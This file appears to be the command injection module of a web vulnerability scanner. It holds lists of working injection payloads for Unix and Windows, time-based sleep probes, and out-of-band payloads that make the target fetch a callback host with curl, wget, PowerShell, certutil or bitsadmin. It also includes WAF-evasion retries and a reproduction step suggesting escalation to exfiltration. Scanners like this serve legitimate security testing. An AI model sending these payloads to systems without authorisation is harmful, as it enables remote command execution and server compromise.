"""
CommandInjectionScanner — multi-signal command injection detection with OOB.

Lifecycle:
  DETECTED:   1 signal (output or time)
  VALIDATED:  2+ signals
  EXPLOITABLE: (not applicable — OOB promotes to VERIFIED)
  VERIFIED:   OOB callback received

Maturity: Level 4 (OOB-confirmed)
"""

import time
from typing import Any, Optional
from urllib.parse import urlparse, parse_qs

from modules.utils import (
    safe_get, finding, log, Colors, _build_curl,
    VerificationStage,
    safe_cookies_dict,
    inject_param,
)
from scanners.base import ScannerBase, DetectionResult, ValidationResult
from models.finding import Finding
from models.evidence import TimingEvidence, HttpRequestEvidence, ResponseExcerptEvidence, CommandExecutionEvidence

CMD_INJECTION_PAYLOADS = {
    "unix": [
        ("; id", "uid="),
        ("| id", "uid="),
        ("`id`", "uid="),
        ("$(id)", "uid="),
        ("; uname -a", "Linux"),
        ("| uname -a", "Linux"),
        ("; whoami", ""),
        ("| whoami", ""),
        ("\tid", "uid="),
        ("\nid", "uid="),
    ],
    "windows": [
        ("| ver", "Microsoft"),
        ("& ver", "Microsoft"),
        ("; systeminfo", "OS"),
        ("| systeminfo", "OS"),
        ("| dir", "Directory"),
        ("& dir", "Directory"),
        ("| type C:\\Windows\\win.ini", "fonts"),
        ("\tver", "Microsoft"),
    ],
    "time_based": [
        ("; sleep 5", 5),
        ("| sleep 5", 5),
        ("& sleep 5", 5),
        ("`sleep 5`", 5),
        ("$(sleep 5)", 5),
    ],
    "oob": [
        # DNS-based — nslookup (cross-platform)
        "| nslookup {oob}",
        "; nslookup {oob}",
        "`nslookup {oob}`",
        "$(nslookup {oob})",
        "| nslookup -q=any {oob}",
        "; nslookup -q=any {oob}",
        # DNS-based — dig (Unix)
        "| dig {oob}",
        "; dig {oob}",
        "`dig {oob}`",
        "$(dig {oob})",
        # DNS-based — host (Unix)
        "| host {oob}",
        "; host {oob}",
        "`host {oob}`",
        # DNS-based — ping (triggers DNS resolution)
        "| ping -c 1 {oob}",
        "; ping -c 1 {oob}",
        "`ping -c 1 {oob}`",
        "| ping -n 1 {oob}",
        "; ping -n 1 {oob}",
        # HTTP-based — curl (cross-platform)
        "| curl http://{oob}/cmd",
        "; curl http://{oob}/cmd",
        "`curl http://{oob}/cmd`",
        "$(curl http://{oob}/cmd)",
        # HTTP-based — wget (Unix)
        "| wget http://{oob}/cmd",
        "; wget http://{oob}/cmd",
        "`wget http://{oob}/cmd`",
        # HTTP-based — fetch (FreeBSD/macOS)
        "| fetch http://{oob}/cmd",
        "; fetch http://{oob}/cmd",
        # Script-based — Python (uses sys.argv quoting to keep it safe)
        "| python -c \"import urllib.request; urllib.request.urlopen('http://{oob}/cmd')\"",
        "| python3 -c \"import urllib.request; urllib.request.urlopen('http://{oob}/cmd')\"",
        # Script-based — Perl
        "| perl -e \"use LWP::Simple; get('http://{oob}/cmd')\"",
        # Script-based — PHP
        "| php -r \"file_get_contents('http://{oob}/cmd');\"",
        # Script-based — Ruby
        "| ruby -e \"require 'net/http'; Net::HTTP.get(URI('http://{oob}/cmd'))\"",
        # Windows-specific — PowerShell
        "| powershell -Command \"Invoke-WebRequest http://{oob}/cmd\"",
        "; powershell -Command \"Invoke-WebRequest http://{oob}/cmd\"",
        "| powershell -Command \"(New-Object Net.WebClient).DownloadString('http://{oob}/cmd')\"",
        "; powershell -Command \"(New-Object Net.WebClient).DownloadString('http://{oob}/cmd')\"",
        # Windows-specific — certutil (DNS exfil)
        "| certutil -split -urlcache http://{oob}/cmd %TEMP%\\out.txt",
        "; certutil -split -urlcache http://{oob}/cmd %TEMP%\\out.txt",
        # Windows-specific — bitsadmin
        "| bitsadmin /transfer job /download /priority high http://{oob}/cmd %TEMP%\\out.txt",
        "; bitsadmin /transfer job /download /priority high http://{oob}/cmd %TEMP%\\out.txt",
    ],
}

CMD_INJECTION_OUTPUT_SIGNATURES = [
    "uid=", "gid=", "groups=", "load average",
]
CMD_INJECTION_OUTPUT_SIGNATURES_WIN = [
    "boot loader", "for 16-bit app support", "Microsoft Windows",
    "Directory of", "Volume in drive",
]

ARGUMENT_INJECTION_PARAMS = [
    "filename", "path", "input", "output", "format", "convert", "resize", "compress",
]

ARGUMENT_INJECTION_PAYLOADS = [
    '--help',
    '-version',
    ';id',
    '|id',
]

ARGUMENT_TOOL_SIGNATURES = [
    "ImageMagick",
    "FFmpeg",
    "pandoc",
    "usage:",
    "Usage:",
]


class CmdInjectionResult:
    """Detection result carrying multi-signal data for command injection."""
    def __init__(self, url: str, param: str, signals: dict,
                 triggering_response: str | None = None,
                 timing_evidence: TimingEvidence | None = None,
                 evidence_parts: list[str] | None = None):
        self.url = url
        self.param = param
        self.signals = signals
        self.triggering_response = triggering_response
        self.timing_evidence = timing_evidence
        self.evidence_parts = evidence_parts or []


class CommandInjectionScanner(ScannerBase):
    SCANNER_NAME = "cmd_injection"
    SCANNER_MATURITY = 4
    TARGET_LEVEL = False

    def __init__(self, config: dict, recon: dict, container=None):
        super().__init__(config, recon, container=container)
        self._oob_registrations: list[tuple[str, str, str]] = []

    # ── Detection phase ─────────────────────────────────────────────────

    def detect(self, url: str, parameter: str | None = None) -> CmdInjectionResult | None:
        if parameter is None:
            params = list(parse_qs(urlparse(url).query).keys())
            if not params:
                return None
            parameter = params[0]
        signals, trigger_resp, timing_ev, evidence_parts = self._test_parameter_signals(url, parameter)
        if not any(signals.values()):
            return None
        return CmdInjectionResult(
            url=url,
            param=parameter,
            signals=signals,
            triggering_response=trigger_resp,
            timing_evidence=timing_ev,
            evidence_parts=evidence_parts,
        )

    def validate(self, detection: CmdInjectionResult) -> ValidationResult | None:
        signal_count = sum(v for v in detection.signals.values() if v)
        evidence_parts = [k for k, v in detection.signals.items() if v]
        if signal_count >= 2:
            return ValidationResult(confirmed=True, signals=evidence_parts, method="multi_signal", detail=f"{signal_count} CMDi signals")
        if signal_count >= 1:
            return ValidationResult(confirmed=False, signals=evidence_parts, method="single_signal", detail="Single CMDi signal")
        return None

    def collect_evidence(self, detection: CmdInjectionResult,
                         validation: ValidationResult | None = None) -> list:
        ev_list = []
        if detection.timing_evidence:
            ev_list.append(detection.timing_evidence)
        # Add CommandExecutionEvidence when signals detected
        if any(detection.signals.values()):
            char_map = {"semicolon": ";", "pipe": "|", "and": "&&", "or": "||", "backtick": "`", "subshell": "$("}
            detected_chars = [char_map.get(k, k) for k, v in detection.signals.items() if v]
            timing_ms = 0.0
            if detection.timing_evidence and hasattr(detection.timing_evidence, "triggered_time_ms"):
                timing_ms = detection.timing_evidence.triggered_time_ms - detection.timing_evidence.baseline_time_ms
            ev_list.append(
                CommandExecutionEvidence(
                    command=f"injection in {detection.param}",
                    shell_chars_detected=detected_chars,
                    output_excerpt=(detection.triggering_response or "")[:300],
                    timing_delay_ms=max(0, timing_ms),
                    description=f"Command injection via {', '.join(detected_chars)} in parameter '{detection.param}'",
                )
            )
        if detection.signals.get("tool_output", 0) > 0 and detection.triggering_response:
            ev_list.append(
                ResponseExcerptEvidence(
                    excerpt=detection.triggering_response[:500],
                    description=f"Tool-specific output for argument injection via '{detection.param}'",
                )
            )
        return ev_list

    def generate_reproduction(self, detection: CmdInjectionResult,
                              validation: ValidationResult | None = None) -> list[str]:
        return [
            f"curl -X GET '{detection.url}?{detection.param}=%3B%20id'",
            f"Observe signal: {', '.join(detection.evidence_parts)} — command output in response or timing delay confirms execution",
            "An attacker can execute arbitrary OS commands on the server, leading to full server compromise, data exfiltration, and lateral movement",
        ]

    # ── Scan entry point ────────────────────────────────────────────────

    def scan(self, target_urls: list[str] | None = None) -> list[Finding]:
        self._prepare_scan()
        urls = self.recon.get("urls", []) if target_urls is None else target_urls
        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                params = list(parse_qs(urlparse(url).query).keys())
                priority_params = {"filename", "file", "cmd", "command", "exec", "run", "shell", "path", "dir", "input", "output", "convert", "process", "action"}
                params.sort(key=lambda p: (0 if p.lower() in priority_params else 1))
                for param in params:
                    detection_result = self.detect(url, param)
                    if detection_result is None:
                        continue

                    validation_result = self.validate(detection_result)
                    evidence_list = self.collect_evidence(detection_result, validation_result)

                    signal_count = sum(v for v in detection_result.signals.values() if v)
                    evidence_parts = [k for k, v in detection_result.signals.items() if v]

                    if signal_count >= 2:
                        title = "Command Injection"
                        severity = "critical"
                        stage = VerificationStage.VALIDATED.value
                    elif signal_count >= 1:
                        title = "Potential Command Injection"
                        severity = "high"
                        stage = VerificationStage.DETECTED.value
                    else:
                        continue

                    f = finding(
                        vuln_type=title,
                        url=url,
                        severity=severity,
                        details=f"Parameter '{param}': {signal_count} signal(s) ({', '.join(evidence_parts)})",
                        evidence=" | ".join(evidence_parts),
                        request=_build_curl("GET", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt=detection_result.triggering_response or "",
                        verification_stage=stage,
                        parameter=param,
                        steps_to_reproduce=self.generate_reproduction(detection_result, validation_result),
                    )
                    if f:
                        for ev in evidence_list:
                            if self.evidence_engine:
                                self.evidence_engine.store(ev)
                                self.evidence_engine.link_to_finding(ev, f.get("fingerprint", ""))
                        self._enrich_finding(f, len(evidence_list), f["verification_stage"], signal_count=signal_count)
                        self._add_finding(f)
            except Exception as e:
                log(f"  [CMD] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
        return self._get_findings()

    def _test_parameter_signals(self, url: str, param: str) -> tuple[dict, Optional[str], Optional[TimingEvidence], list[str]]:
        signals: dict[str, int] = {"output": 0, "time": 0, "oob": 0, "tool_output": 0}
        evidence_parts: list[str] = []
        triggering_response: Optional[str] = None
        timing_ev: Optional[TimingEvidence] = None
        cmdi_payloads = self._load_payloads("cmdi")

        if param.lower() in ARGUMENT_INJECTION_PARAMS:
            for arg_payload in ARGUMENT_INJECTION_PAYLOADS:
                test_url = inject_param(url, param, arg_payload)
                resp = safe_get(self.session, test_url, self.timeout)
                if not resp:
                    continue
                body = resp.text
                for sig in ARGUMENT_TOOL_SIGNATURES:
                    if sig in body:
                        signals["tool_output"] = 2
                        evidence_parts.append(f"argument:{sig}")
                        triggering_response = resp.text[:500]
                        break
                if signals["tool_output"]:
                    break

        for payload, expected in cmdi_payloads.get("unix", CMD_INJECTION_PAYLOADS.get("unix", [])):
            test_url = inject_param(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if not resp:
                continue
            if self._is_waf_block(resp) and self.waf_fingerprint:
                _variants = self._evade_waf(payload, "cmd_injection")
                for _v in _variants:
                    if _v == payload:
                        continue
                    _ev_url = inject_param(url, param, _v)
                    _r2 = safe_get(self.session, _ev_url, self.timeout)
                    if _r2 and not self._is_waf_block(_r2):
                        resp = _r2
                        payload = _v
                        test_url = _ev_url
                        break
            body = resp.text
            if expected and expected in body:
                signals["output"] = True
                evidence_parts.append(f"output:{expected}")
                triggering_response = resp.text[:500]
                break
            for sig in CMD_INJECTION_OUTPUT_SIGNATURES:
                if sig in body:
                    signals["output"] = True
                    evidence_parts.append(f"output:{sig}")
                    triggering_response = resp.text[:500]
                    break
            if signals["output"]:
                break

        parsed_url = urlparse(url)
        is_windows_target = ".aspx" in parsed_url.path.lower()
        if not is_windows_target:
            probe_resp = safe_get(self.session, url, self.timeout)
            if probe_resp:
                server = probe_resp.headers.get("Server", "")
                x_powered = probe_resp.headers.get("X-Powered-By", "")
                if "IIS" in server or "ASP.NET" in x_powered:
                    is_windows_target = True
        if is_windows_target:
            win_payloads = ["%26whoami%26", "%7Cwhoami", "^whoami^"]
            for win_payload in win_payloads:
                test_url = inject_param(url, param, win_payload)
                resp = safe_get(self.session, test_url, self.timeout)
                if not resp:
                    continue
                body = resp.text
                if "nt authority" in body.lower():
                    signals["output"] = 1
                    evidence_parts.append("output:whoami")
                    triggering_response = resp.text[:500]
                    break

        if not signals["output"]:
            for payload, expected in cmdi_payloads.get("windows", CMD_INJECTION_PAYLOADS.get("windows", [])):
                test_url = inject_param(url, param, payload)
                resp = safe_get(self.session, test_url, self.timeout)
                if not resp:
                    continue
                body = resp.text
                if expected and expected in body:
                    signals["output"] = True
                    evidence_parts.append(f"output:{expected}")
                    triggering_response = resp.text[:500]
                    break
                for sig in CMD_INJECTION_OUTPUT_SIGNATURES_WIN:
                    if sig in body:
                        signals["output"] = True
                        evidence_parts.append(f"output:{sig}")
                        triggering_response = resp.text[:500]
                        break

        if not signals["output"]:
            baseline_start = time.time()
            safe_get(self.session, url, timeout=15, raise_for_status=False)
            baseline_delay = time.time() - baseline_start
            baseline_ms = baseline_delay * 1000
            for payload, min_delay in cmdi_payloads.get("time_based", CMD_INJECTION_PAYLOADS.get("time_based", [])):
                test_url = inject_param(url, param, payload)
                delays = []
                time_resp = None
                for _ in range(2):
                    start = time.time()
                    time_resp = safe_get(self.session, test_url, timeout=15, raise_for_status=False)
                    delays.append(time.time() - start)
                min_delay_actual = min(delays)
                if min_delay_actual > baseline_delay + 4 and all(d > baseline_delay + 3 for d in delays):
                    signals["time"] = True
                    triggered_ms = min_delay_actual * 1000
                    timing_ev = TimingEvidence(
                        baseline_time_ms=baseline_ms,
                        triggered_time_ms=triggered_ms,
                        total_attempts=len(delays),
                        description=f"Time-based CMDi on param '{param}': {triggered_ms:.0f}ms vs baseline {baseline_ms:.0f}ms",
                    )
                    evidence_parts.append(f"time:delay={min_delay_actual:.1f}s")
                    if time_resp:
                        triggering_response = time_resp.text[:500]
                    break

        oob_host = self.validation.callback_host if self.validation else ""
        if oob_host:
            oob_payloads = cmdi_payloads.get("oob", CMD_INJECTION_PAYLOADS.get("oob", []))
            oob_payload_str = self.validation.generate_oob_payload() if hasattr(self.validation, "generate_oob_payload") else f"x.{oob_host}"
            registered_count = 0
            for payload_template in oob_payloads:
                # Handle both string payloads and (payload, flag) tuples
                if isinstance(payload_template, tuple):
                    payload_template = payload_template[0]
                payload = payload_template.replace("{oob}", oob_payload_str)
                test_url = inject_param(url, param, payload)
                safe_get(self.session, test_url, self.timeout, raise_for_status=False)
                self.validation.register_oob("cmd_injection", payload, test_url)
                self._oob_registrations.append(("cmd_injection", payload, test_url))
                registered_count += 1
                if registered_count >= 5:
                    break
            if registered_count > 0:
                signals["oob"] = 2

        return signals, triggering_response, timing_ev, evidence_parts

    def _test_parameter(self, url: str, param: str) -> tuple[dict, Optional[str], Optional[TimingEvidence]]:
        signals, trigger_resp, timing_ev, _ = self._test_parameter_signals(url, param)
        return signals, trigger_resp, timing_ev

    def _build_finding(self, url: str, param: str, signals: dict,
                       request_str: str = "", response_excerpt_str: str = "",
                       timing_ev: TimingEvidence | None = None) -> Optional[dict]:
        signal_count = sum(v for v in signals.values() if v)
        evidence_parts = [k for k, v in signals.items() if v]

        if signal_count >= 2:
            title = "Command Injection"
            severity = "critical"
            stage = VerificationStage.VALIDATED.value
        elif signal_count >= 1:
            title = "Potential Command Injection"
            severity = "high"
            stage = VerificationStage.DETECTED.value
        else:
            return None

        f = finding(
            vuln_type=title,
            url=url,
            severity=severity,
            details=f"Parameter '{param}': {signal_count} signal(s) ({', '.join(evidence_parts)})",
            evidence=" | ".join(evidence_parts),
            request=request_str or _build_curl("GET", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
            response_excerpt=response_excerpt_str,
            verification_stage=stage,
            parameter=param,
            steps_to_reproduce=[
                f"Send request to {url} with command injection payload (;, |, ||, &&) in parameter '{param}'",
                f"Observe signal: {', '.join(evidence_parts)} — command output in response or timing delay confirms execution",
            ],
        )
        if f and timing_ev:
            self.evidence_engine.store(timing_ev)
            self.evidence_engine.link_to_finding(timing_ev, f.get("fingerprint", ""))
        return f

    def finalize(self) -> list[Finding]:
        extra: list[dict] = []
        if not self.validation:
            return extra
        confirmed = self.validation.poll_oob()
        for ev in confirmed:
            payload_str = ev.callback_host or ""
            url_str = ""
            for vt, pl, u in self._oob_registrations:
                if payload_str and payload_str in pl:
                    url_str = u
                    break
            f = finding(
                vuln_type="Command Injection",
                url=url_str,
                severity="critical",
                details="Command injection confirmed via OOB callback — injected command executed on server",
                evidence=f"Callback: {(ev.raw_data or '')[:200]}",
                request=_build_curl("GET", url_str, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                verification_stage=VerificationStage.VERIFIED.value,
                response_excerpt="(Command injection confirmed via out-of-band callback — server executed injected command)",
                steps_to_reproduce=[
                    f"Send request to {url_str} with command injection OOB payload (e.g. nslookup <oob-host> or curl <oob-host>) in vulnerable parameter",
                    "Observe OOB callback — the server executed the injected command, confirming remote command execution",
                    "Escalate: use full RCE for data exfiltration, lateral movement, or persistent access",
                ],
            )
            if f:
                self.evidence_engine.store(ev)
                self.evidence_engine.link_to_finding(ev, f.get("fingerprint", ""))
                self._enrich_finding(f, 1, f["verification_stage"], signal_count=2)
                self._add_finding(f)
                extra.append(f)
            log(f"  [CMD OOB] {url_str}", Colors.RED, verbose_only=True, verbose=self.verbose)
        return extra


